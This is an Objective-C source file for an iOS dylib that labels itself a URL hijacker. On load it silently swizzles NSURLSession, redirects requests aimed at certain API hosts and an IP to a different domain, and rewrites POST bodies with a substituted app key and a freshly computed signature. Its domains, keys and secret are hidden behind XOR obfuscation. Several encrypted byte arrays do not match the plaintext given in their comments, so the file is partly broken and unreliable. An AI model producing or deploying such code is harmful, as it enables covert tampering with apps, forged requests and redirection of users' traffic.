// URLHijackDetector.m
// iOS URL Hijack Dylib - 加密版（基于可工作版本）
#import <Foundation/Foundation.h>
#import <objc/runtime.h>
#import <CommonCrypto/CommonDigest.h>

#pragma mark - XOR 解密工具

static NSString* xorDecrypt(const unsigned char *encrypted, size_t length, unsigned char key) {
    NSMutableData *data = [NSMutableData dataWithBytes:encrypted length:length];
    unsigned char *bytes = (unsigned char *)[data mutableBytes];
    
    for (size_t i = 0; i < length; i++) {
        bytes[i] ^= key;
    }
    
    return [[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding];
}

#define DECRYPT_STR(arr, key) xorDecrypt(arr, sizeof(arr), key)

#pragma mark - 加密的配置数据

// "api1.7ccccccc.com" XOR 0x5A
static const unsigned char _enc_domain1[] = {0x39, 0x2b, 0x2a, 0x78, 0x3b, 0x24, 0x3a, 0x3c, 0x3c, 0x3c, 0x3c, 0x2c, 0x0b, 0x3f, 0x2b, 0x2b, 0x2b, 0x3a, 0x2c, 0x0b, 0x2b, 0x2c, 0x3b};
// "api2.7ccccccc.com" XOR 0x5A
static const unsigned char _enc_domain2[] = {0x39, 0x2b, 0x2a, 0x78, 0x34, 0x24, 0x3a, 0x3c, 0x3c, 0x3c, 0x3c, 0x2c, 0x0b, 0x3f, 0x2b, 0x2b, 0x2b, 0x3a, 0x2c, 0x0b, 0x2b, 0x2c, 0x3b};
// "api3.7ccccccc.com" XOR 0x5A
static const unsigned char _enc_domain3[] = {0x39, 0x2b, 0x2a, 0x78, 0x35, 0x24, 0x3a, 0x3c, 0x3c, 0x3c, 0x3c, 0x2c, 0x0b, 0x3f, 0x2b, 0x2b, 0x2b, 0x3a, 0x2c, 0x0b, 0x2b, 0x2c, 0x3b};
// "45.205.27.82:8080" XOR 0x5A
static const unsigned char _enc_ip[] = {0x1f, 0x7b, 0x32, 0x3e, 0x2f, 0x7f, 0x32, 0x3b, 0x2d, 0x2f, 0x7e, 0x32, 0x30, 0x2e, 0x2c, 0x0b, 0x34, 0x34, 0x34, 0x34};
// "api123.hezijun.top" XOR 0x5A
static const unsigned char _enc_newdomain[] = {0x39, 0x2b, 0x2a, 0x78, 0x7d, 0x7d, 0x7d, 0x24, 0x2b, 0x3a, 0x2b, 0x28, 0x2e, 0x3a, 0x78, 0x3b, 0x2b, 0x3a, 0x2a, 0x3b};
// "LWtAvVixXX39mGYL2w" XOR 0x5A
static const unsigned char _enc_oldappkey[] = {0x1c, 0x52, 0x3f, 0x2d, 0x44, 0x4f, 0x2a, 0x1c, 0x1c, 0x6b, 0x6b, 0x7b, 0x7d, 0x2d, 0x1f, 0x4d, 0x1a, 0x6b, 0x7d};
// "QLObIPwnDOVts3mzw9" XOR 0x5A
static const unsigned char _enc_newappkey[] = {0x1d, 0x11, 0x1c, 0x2a, 0x4b, 0x54, 0x4c, 0x2b, 0x1d, 0x1d, 0x0b, 0x4e, 0x1c, 0x6f, 0x1e, 0x4e, 0x4e, 0x5f, 0x6b};
// "XtUdpwzWVW1wAbTeSDWevcBJXFJGY2cx" XOR 0x5A
static const unsigned char _enc_appsecret[] = {0x1c, 0x3f, 0x4c, 0x2d, 0x3e, 0x4c, 0x54, 0x0d, 0x4c, 0x1c, 0x78, 0x0d, 0x1e, 0x2c, 0x0d, 0x48, 0x35, 0x2c, 0x1b, 0x4c, 0x04, 0x0d, 0x48, 0x1c, 0x2f, 0x1b, 0x0e, 0x1e, 0x0d, 0x1c, 0x0d, 0x48, 0x0d, 0x2b, 0x1d, 0x1e};

#pragma mark - 配置区（通过解密获取）

static NSSet<NSString *> *getTargetDomains(void) {
    static NSSet *domains = nil;
    static dispatch_once_t onceToken;
    dispatch_once(&onceToken, ^{
        NSString *d1 = DECRYPT_STR(_enc_domain1, 0x5A);
        NSString *d2 = DECRYPT_STR(_enc_domain2, 0x5A);
        NSString *d3 = DECRYPT_STR(_enc_domain3, 0x5A);
        NSString *ip = DECRYPT_STR(_enc_ip, 0x5A);
        domains = [NSSet setWithArray:@[d1, d2, d3, ip]];
    });
    return domains;
}

static NSSet<NSString *> *getRedirectIPs(void) {
    static NSSet *ips = nil;
    static dispatch_once_t onceToken;
    dispatch_once(&onceToken, ^{
        NSString *ip = DECRYPT_STR(_enc_ip, 0x5A);
        ips = [NSSet setWithArray:@[ip]];
    });
    return ips;
}

static NSString *getNewDomain(void) {
    static NSString *domain = nil;
    static dispatch_once_t onceToken;
    dispatch_once(&onceToken, ^{
        domain = DECRYPT_STR(_enc_newdomain, 0x5A);
    });
    return domain;
}

static NSString *getOldAppKey(void) {
    static NSString *appKey = nil;
    static dispatch_once_t onceToken;
    dispatch_once(&onceToken, ^{
        appKey = DECRYPT_STR(_enc_oldappkey, 0x5A);
    });
    return appKey;
}

static NSString *getNewAppKey(void) {
    static NSString *appKey = nil;
    static dispatch_once_t onceToken;
    dispatch_once(&onceToken, ^{
        appKey = DECRYPT_STR(_enc_newappkey, 0x5A);
    });
    return appKey;
}

static NSString *getAppSecret(void) {
    static NSString *secret = nil;
    static dispatch_once_t onceToken;
    dispatch_once(&onceToken, ^{
        secret = DECRYPT_STR(_enc_appsecret, 0x5A);
    });
    return secret;
}

#pragma mark - 加密工具函数

static NSString* md5(NSString *string) {
    const char *cStr = [string UTF8String];
    unsigned char digest[CC_MD5_DIGEST_LENGTH];
    CC_MD5(cStr, (CC_LONG)strlen(cStr), digest);
    
    NSMutableString *output = [NSMutableString stringWithCapacity:CC_MD5_DIGEST_LENGTH * 2];
    for(int i = 0; i < CC_MD5_DIGEST_LENGTH; i++) {
        [output appendFormat:@"%02x", digest[i]];
    }
    return output;
}

#pragma mark - 签名计算

static NSString* calculateSign(NSString *httpMethod, NSString *host, NSString *path, NSDictionary *params, NSString *appSecret) {
    NSArray *sortedKeys = [[params allKeys] sortedArrayUsingSelector:@selector(compare:)];
    NSMutableString *paramString = [NSMutableString string];
    for (NSString *key in sortedKeys) {
        if ([key isEqualToString:@"sign"]) continue;
        if (paramString.length > 0) {
            [paramString appendString:@"&"];
        }
        [paramString appendFormat:@"%@=%@", key, params[key]];
    }
    
    NSString *stringToSign = [NSString stringWithFormat:@"%@%@%@%@%@", 
                               httpMethod, host, path, paramString, appSecret];
    
    return md5(stringToSign);
}

#pragma mark - 请求参数修改

static NSData* modifyRequestBody(NSData *originalBody, NSString *originalURL, NSString *httpMethod, NSString *host, NSString *path) {
    if (!originalBody) return originalBody;
    
    NSString *bodyString = [[NSString alloc] initWithData:originalBody encoding:NSUTF8StringEncoding];
    if (!bodyString) return originalBody;
    
    NSMutableDictionary *params = [NSMutableDictionary dictionary];
    NSArray *pairs = [bodyString componentsSeparatedByString:@"&"];
    for (NSString *pair in pairs) {
        NSArray *kv = [pair componentsSeparatedByString:@"="];
        if (kv.count == 2) {
            params[kv[0]] = kv[1];
        }
    }
    
    NSString *oldAppKey = getOldAppKey();
    NSString *newAppKey = getNewAppKey();
    
    if ([params[@"appKey"] isEqualToString:oldAppKey]) {
        params[@"appKey"] = newAppKey;
        
        NSString *newSign = calculateSign(httpMethod, host, path, params, getAppSecret());
        params[@"sign"] = newSign;
        
        NSMutableArray *newPairs = [NSMutableArray array];
        for (NSString *key in params) {
            [newPairs addObject:[NSString stringWithFormat:@"%@=%@", key, params[key]]];
        }
        NSString *newBodyString = [newPairs componentsJoinedByString:@"&"];
        
        return [newBodyString dataUsingEncoding:NSUTF8StringEncoding];
    }
    
    return originalBody;
}

#pragma mark - URL 匹配与替换

static NSString* replaceURLIfNeeded(NSString *originalURLString, NSString **outHost, NSString **outPath) {
    NSURL *url = [NSURL URLWithString:originalURLString];
    if (!url) return originalURLString;
    
    NSString *host = url.host;
    if (!host) return originalURLString;
    
    if (outHost) *outHost = host;
    if (outPath) *outPath = url.path;
    
    NSString *hostWithPort = nil;
    if (url.port) {
        hostWithPort = [NSString stringWithFormat:@"%@:%@", host, url.port];
    }
    
    BOOL needsRedirect = NO;
    if (hostWithPort && [getRedirectIPs() containsObject:hostWithPort]) {
        needsRedirect = YES;
    } else if ([getRedirectIPs() containsObject:host]) {
        needsRedirect = YES;
    }
    
    if (needsRedirect) {
        NSString *newURLString = originalURLString;
        newURLString = [newURLString stringByReplacingOccurrencesOfString:host 
                                                               withString:getNewDomain()];
        if (url.port) {
            NSString *oldPortStr = [NSString stringWithFormat:@":%d", [url.port intValue]];
            newURLString = [newURLString stringByReplacingOccurrencesOfString:oldPortStr 
                                                                   withString:@""];
        }
        
        if (outHost) *outHost = getNewDomain();
        
        return newURLString;
    }
    
    return originalURLString;
}

static BOOL isTargetRequest(NSString *urlString) {
    NSURL *url = [NSURL URLWithString:urlString];
    if (!url) return NO;
    
    NSString *host = url.host;
    if (!host) return NO;
    
    if ([getTargetDomains() containsObject:host]) {
        return YES;
    }
    
    if (url.port) {
        NSString *hostWithPort = [NSString stringWithFormat:@"%@:%@", host, url.port];
        if ([getTargetDomains() containsObject:hostWithPort]) {
            return YES;
        }
    }
    
    return NO;
}

#pragma mark - NSURLSession Hook

@interface NSURLSession (Hijack)
@end

@implementation NSURLSession (Hijack)

+ (void)load {
    static dispatch_once_t onceToken;
    dispatch_once(&onceToken, ^{
        Class class = [NSURLSession class];
        
        SEL originalSelector = @selector(dataTaskWithRequest:completionHandler:);
        SEL swizzledSelector = @selector(hijacked_dataTaskWithRequest:completionHandler:);
        
        Method originalMethod = class_getInstanceMethod(class, originalSelector);
        
        if (!originalMethod) return;
        
        __block id replacementBlock = ^(id self, NSURLRequest *request, void (^completionHandler)(NSData*, NSURLResponse*, NSError*)) {
            return [self hijacked_dataTaskWithRequest:request completionHandler:completionHandler];
        };
        
        class_addMethod(class, swizzledSelector, imp_implementationWithBlock(replacementBlock), "@@:@?");
        
        Method swizzledMethod = class_getInstanceMethod(class, swizzledSelector);
        
        if (originalMethod && swizzledMethod) {
            method_exchangeImplementations(originalMethod, swizzledMethod);
        }
    });
}

- (NSURLSessionDataTask *)hijacked_dataTaskWithRequest:(NSURLRequest *)request 
                                      completionHandler:(void (^)(NSData *data, NSURLResponse *response, NSError *error))completionHandler {
    
    NSString *originalURLString = request.URL.absoluteString;
    NSMutableURLRequest *mutableRequest = [request mutableCopy];
    BOOL modified = NO;
    
    if (isTargetRequest(originalURLString)) {
        
        NSString *host = nil;
        NSString *path = nil;
        
        NSString *newURLString = replaceURLIfNeeded(originalURLString, &host, &path);
        if (![newURLString isEqualToString:originalURLString]) {
            [mutableRequest setURL:[NSURL URLWithString:newURLString]];
            modified = YES;
        } else {
            NSURL *url = [NSURL URLWithString:originalURLString];
            host = url.host;
            path = url.path;
        }
        
        if ([request.HTTPMethod isEqualToString:@"POST"] && request.HTTPBody) {
            NSData *newBody = modifyRequestBody(request.HTTPBody, originalURLString, request.HTTPMethod, host, path);
            if (newBody != request.HTTPBody) {
                [mutableRequest setHTTPBody:newBody];
                [mutableRequest setValue:[NSString stringWithFormat:@"%lu", (unsigned long)newBody.length] 
                      forHTTPHeaderField:@"Content-Length"];
                modified = YES;
            }
        }
    }
    
    if (!modified) {
        return [self hijacked_dataTaskWithRequest:request completionHandler:completionHandler];
    }
    
    return [self hijacked_dataTaskWithRequest:mutableRequest completionHandler:completionHandler];
}

@end

__attribute__((constructor))
static void initialize() {
    // 静默加载 - 生产环境不输出日志
    // 如需调试，取消下面的注释
    // NSLog(@"[Hijack] Loaded");
}
